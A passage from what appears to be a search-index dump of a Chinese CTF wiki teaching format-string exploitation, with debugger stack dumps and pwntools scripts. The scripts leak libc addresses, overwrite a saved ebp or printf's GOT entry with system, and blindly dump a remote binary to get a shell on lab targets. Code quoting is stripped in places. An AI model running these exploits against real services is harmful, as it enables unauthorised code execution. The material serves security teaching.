\u2192   11111 \n0xffffcd2c\u2502+0x30: 0x0804c420  \u2192   1234567 \n0xffffcd30\u2502+0x34: 0xf7fadd60  \u2192  0xfbad2887\n0xffffcd34\u2502+0x38: 0x08048ed6  \u2192  0x25007325  ( %s ? ) \n0xffffcd38\u2502+0x3c: 0x0804b0a0  \u2192  0x0804c420  \u2192   1234567 \n0xffffcd3c\u2502+0x40: 0x00000000\n0xffffcd40\u2502+0x44: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd44\u2502+0x48: 0x00000000\n0xffffcd48\u2502+0x4c: 0xffffcd78  \u2192  0x00000000\n0xffffcd4c\u2502+0x50: 0x080487a2  \u2192   jmp 0x80487b3\n0xffffcd50\u2502+0x54: 0x0804b0a0  \u2192  0x0804c420  \u2192   1234567 \n0xffffcd54\u2502+0x58: 0xffffcd68  \u2192  0x00000004\n0xffffcd58\u2502+0x5c: 0x00000050  ( P ? ) \n0xffffcd5c\u2502+0x60: 0x00000000\n0xffffcd60\u2502+0x64: 0xf7fad3dc  \u2192  0xf7fae1e0  \u2192  0x00000000\n0xffffcd64\u2502+0x68: 0x08048288  \u2192  0x00000082\n0xffffcd68\u2502+0x6c: 0x00000004\n0xffffcd6c\u2502+0x70: 0x0000000a\n0xffffcd70\u2502+0x74: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd74\u2502+0x78: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd78\u2502+0x7c: 0x00000000\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192   __libc_start_main+247  add esp, 0x10\n0xffffcd80\u2502+0x84: 0x00000001\n0xffffcd84\u2502+0x88: 0xffffce14  \u2192  0xffffd00d  \u2192   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...] \n0xffffcd88\u2502+0x8c: 0xffffce1c  \u2192  0xffffd058  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]   \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230  0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192   __libc_start_main+247  add esp, 0x10  \u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002  gef\u27a4  fmtarg 0xffffcd7c\nThe index of format argument :  32   \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002  \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002  \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002  0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp", 
            "title": "\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_29", 
            "text": "\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002  [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]  \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002  \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002", 
            "title": "\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#ebp", 
            "text": "\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002  \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002  part1 = (heap_addr - 4) / 2\npart2 = heap_addr - 4 - part1\npayload =  %  + str(part1) +  x%  + str(part2) +  x%6$n", 
            "title": "\u4fee\u6539ebp"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#shell", 
            "text": "\u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002", 
            "title": "\u83b7\u53d6shell"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_30", 
            "text": "from   pwn   import   *  from   LibcSearcher   import   *  contact   =   ELF ( ./contacts )  ##context.log_level =  debug  if   args [ REMOTE ]: \n     sh   =   remote ( 11 ,   111 )  else : \n     sh   =   process ( ./contacts )  def   createcontact ( name ,   phone ,   descrip_len ,   description ): \n     sh . recvuntil (   ) \n     sh . sendline ( 1 ) \n     sh . recvuntil ( Contact info:  \\n ) \n     sh . recvuntil ( Name:  ) \n     sh . sendline ( name ) \n     sh . recvuntil ( You have 10 numbers \\n ) \n     sh . sendline ( phone ) \n     sh . recvuntil ( Length of description:  ) \n     sh . sendline ( descrip_len ) \n     sh . recvuntil ( description: \\n\\t\\t ) \n     sh . sendline ( description )  def   printcontact (): \n     sh . recvuntil (   ) \n     sh . sendline ( 4 ) \n     sh . recvuntil ( Contacts: ) \n     sh . recvuntil ( Description:  )  ## get system addr   binsh_addr  payload   =   %31$paaaa  createcontact ( 1111 ,   1111 ,   111 ,   payload )  printcontact ()  libc_start_main_ret   =   int ( sh . recvuntil ( aaaa ,   drop = True ),   16 )  log . success ( get libc_start_main_ret addr:    +   hex ( libc_start_main_ret ))  libc   =   LibcSearcher ( __libc_start_main_ret ,   libc_start_main_ret )  libc_base   =   libc_start_main_ret   -   libc . dump ( __libc_start_main_ret )  system_addr   =   libc_base   +   libc . dump ( system )  binsh_addr   =   libc_base   +   libc . dump ( str_bin_sh )  log . success ( get system addr:    +   hex ( system_addr ))  log . success ( get binsh addr:    +   hex ( binsh_addr ))  ##gdb.attach(sh)  ## get heap addr and ebp addr  payload   =   flat ([ \n     system_addr , \n     bbbb , \n     binsh_addr , \n     %6$p%11$pcccc ,  ])  createcontact ( 2222 ,   2222 ,   222 ,   payload )  printcontact ()  sh . recvuntil ( Description:  )  data   =   sh . recvuntil ( cccc ,   drop = True )  data   =   data . split ( 0x )  print   data  ebp_addr   =   int ( data [ 1 ],   16 )  heap_addr   =   int ( data [ 2 ],   16 )  ## modify ebp  part1   =   ( heap_addr   -   4 )   /   2  part2   =   heap_addr   -   4   -   part1  payload   =   %   +   str ( part1 )   +   x%   +   str ( part2 )   +   x%6$n  ##print payload  createcontact ( 3333 ,   123456789 ,   300 ,   payload )  printcontact ()  sh . recvuntil ( Description:  )  sh . recvuntil ( Description:  )  ##gdb.attach(sh)  print   get shell  sh . recvuntil (   )  ##get shell  sh . sendline ( 5 )  sh . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_31", 
            "text": "", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_32", 
            "text": "\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c   \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570  \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e   \u5229\u7528   \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#1-", 
            "text": "\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002", 
            "title": "\u4f8b\u5b501-\u6cc4\u9732\u6808"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_33", 
            "text": "\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f  \u279c  blind_fmt_stack git: ( master )  \u2717 nc localhost  9999 \n%p\n0x7ffd4799beb0\nG\ufffdflag is on the stack%                            \u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002", 
            "title": "\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_34", 
            "text": "\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b  from   pwn   import   *  context . log_level   =   error  def   leak ( payload ): \n     sh   =   remote ( 127.0.0.1 ,   9999 ) \n     sh . sendline ( payload ) \n     data   =   sh . recvuntil ( \\n ,   drop = True ) \n     if   data . startswith ( 0x ): \n         print   p64 ( int ( data ,   16 )) \n     sh . close ()  i   =   1  while   1 : \n     payload   =   %{}$p . format ( i ) \n     leak ( payload ) \n     i   +=   1   \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag  ////////\n//////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff\nflag { thi\ns_is_fla\ng } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00  \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#2-got", 
            "text": "\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002", 
            "title": "\u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_35", 
            "text": "\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002  \u279c  blind_fmt_got git: ( master )  \u2717 nc localhost  9999 \n%p\n0x7fff3b9774c0  \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002", 
            "title": "\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_36", 
            "text": "\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b  \u279c  blind_fmt_got git: ( master )  \u2717 nc localhost  9999 \naaaaaaaa%p%p%p%p%p%p%p%p%p\naaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025  \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#binary", 
            "text": "\u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002  ##coding=utf8  from   pwn   import   *  ##context.log_level =  debug  ip   =   127.0.0.1  port   =   9999  def   leak ( addr ): \n     # leak addr for three times \n     num   =   0 \n     while   num     3 : \n         try : \n             print   leak addr:    +   hex ( addr ) \n             sh   =   remote ( ip ,   port ) \n             payload   =   %00008$s   +   STARTEND   +   p64 ( addr ) \n             # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c \n             if   \\x0a   in   payload : \n                 return   None \n             sh . sendline ( payload ) \n             data   =   sh . recvuntil ( STARTEND ,   drop = True ) \n             sh . close () \n             return   data \n         except   Exception : \n             num   +=   1 \n             continue \n     return   None  def   getbinary (): \n     addr   =   0x400000 \n     f   =   open ( binary ,   w ) \n     while   addr     0x401000 : \n         data   =   leak ( addr ) \n         if   data   is   None : \n             f . write ( \\xff ) \n             addr   +=   1 \n         elif   len ( data )   ==   0 : \n             f . write ( \\x00 ) \n             addr   +=   1 \n         else : \n             f . write ( data ) \n             addr   +=   len ( data ) \n     f . close ()  getbinary ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002", 
            "title": "\u6cc4\u9732binary"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#binary_1", 
            "text": "\u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740  seg000: 00000000004005 F6                   push      rbp  seg000: 00000000004005 F7                   mov       rbp ,   rsp  seg000: 00000000004005 FA                   add       rsp ,   0 FFFFFFFFFFFFFF80h  seg000: 00000000004005 FE  seg000: 00000000004005 FE   loc_4005FE :                               ; CODE XREF: seg000:0000000000400639\u0019j  seg000 : 00000000004005 FE                   lea       rax ,   [ rbp-80h ]  seg000: 0000000000400602                   mov       edx ,   80 h   ;  \u20ac  seg000 : 0000000000400607                   mov       rsi ,   rax  seg000: 000000000040060 A                   mov       edi ,   0  seg000: 000000000040060 F                   mov       eax ,   0  seg000: 0000000000400614                   call      sub_4004C0  seg000: 0000000000400619                   lea       rax ,   [ rbp-80h ]  seg000: 000000000040061 D                   mov       rdi ,   rax  seg000: 0000000000400620                   mov       eax ,   0  seg000: 0000000000400625                   call      sub_4004B0  seg000: 000000000040062 A                   mov       rax ,   cs : 601048 h  seg000: 0000000000400631                   mov       rdi ,   rax  seg000: 0000000000400634                   call      near   ptr   unk_4004E0  seg000: 0000000000400639                   jmp       short   loc_4005FE   \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002", 
            "title": "\u5206\u6790binary"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_37", 
            "text": "\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def   \u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c  \u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740  \u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740  \u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_38", 
            "text": "\u7a0b\u5e8f\u5982\u4e0b\u3002  ##coding=utf8  import   math  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  context . arch   =   amd64  ip   =   127.0.0.1  port   =   9999  def   leak ( addr ): \n     # leak addr for three times \n     num   =   0 \n     while   num     3 : \n         try : \n             print   leak addr:    +   hex ( addr ) \n             sh   =   remote ( ip ,   port ) \n             payload   =   %00008$s   +   STARTEND   +   p64 ( addr ) \n             # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c \n             if   \\x0a   in   payload : \n                 return   None \n             sh . sendline ( payload ) \n             data   =   sh . recvuntil ( STARTEND ,   drop = True ) \n             sh . close () \n             return   data \n         except   Exception : \n             num   +=   1 \n             continue \n     return   None  def   getbinary (): \n     addr   =   0x400000 \n     f   =   open ( binary ,   w ) \n     while   addr     0x401000 : \n         data   =   leak ( addr ) \n         if   data   is   None : \n             f . write ( \\xff ) \n             addr   +=   1 \n         elif   len ( data )   ==   0 : \n             f . write ( \\x00 ) \n             addr   +=   1 \n         else : \n             f . write ( data ) \n             addr   +=   len ( data ) \n     f . close ()  ##getbinary()  read_got   =   0x601020  printf_got   =   0x601018  sh   =   remote ( ip ,   port )  ## let the read get resolved  sh . sendline ( a )  sh . recv ()  ## get printf addr  payload   =   %00008$s   +   STARTEND   +   p64 ( read_got )  sh . sendline ( payload )  data   =   sh . recvuntil ( STARTEND ,   drop = True ) . ljust ( 8 ,   \\x00 )  sh . recv ()  read_addr   =   u64 ( data )  ## get system addr  libc   =   LibcSearcher ( read ,   read_addr )  libc_base   =   read_addr   -   libc . dump ( read )  system_addr   =   libc_base   +   libc . dump ( system )  log . success ( system addr:    +   hex ( system_addr ))  log . success ( read   addr:    +   hex ( read_addr ))  ## modify printf_got  payload   =   fmtstr_payload ( 6 ,   { printf_got :   system_addr },   0 ,   write_size = short )  ## get all the addr  addr   =   payload [: 32 ]  payload   =   %32d   +   payload [ 32 :]  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )  for   i   in   range ( 6 ,   10 ): \n     old   =   %{}$ . format ( i ) \n     new   =   %{}$ . format ( offset   +   i ) \n     payload   =   payload . replace ( old ,   new )  remainer   =   len ( payload )   %   8  payload   +=   ( 8   -   remainer )   *   a  payload   +=   addr  sh . sendline ( payload )  sh . recv ()  ## get shell  sh . sendline ( /bin/sh; )  sh . interactive ()   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801  ## modify printf_got  payload   =   fmtstr_payload ( 6 ,   { printf_got :   system_addr },   0 ,   write_size = short )  ## get all the addr  addr   =   payload [: 32 ]  payload   =   %32d   +   payload [ 32 :]  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )  for   i   in   range ( 6 ,   10 ): \n     old   =   %{}$ . format ( i ) \n     new   =   %{}$ . format ( offset   +   i ) \n     payload   =   payload . replace ( old ,   new )  remainer   =   len ( payload )   %   8  payload   +=   ( 8   -   remainer )   *   a  payload   +=   addr  sh . sendline ( payload )  sh . recv ()   fmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f  offset   =   ( int )( math . ceil ( len ( payload )   /   8.0 )   +   1 )   \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_detect/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b\n\n\n\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177\nLazyIDA\n\u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_detect/#_1", 
            "text": "\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a\u7b80\u5355\u7684\u5de5\u5177 LazyIDA \u3002\u57fa\u672c\u7684\u68c0\u6d4b\u5e94\u8be5\u6ca1\u6709\u95ee\u9898\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u68c0\u6d4b"
        }, 
        {
            "location": "/pwn/heap/introduction/", 
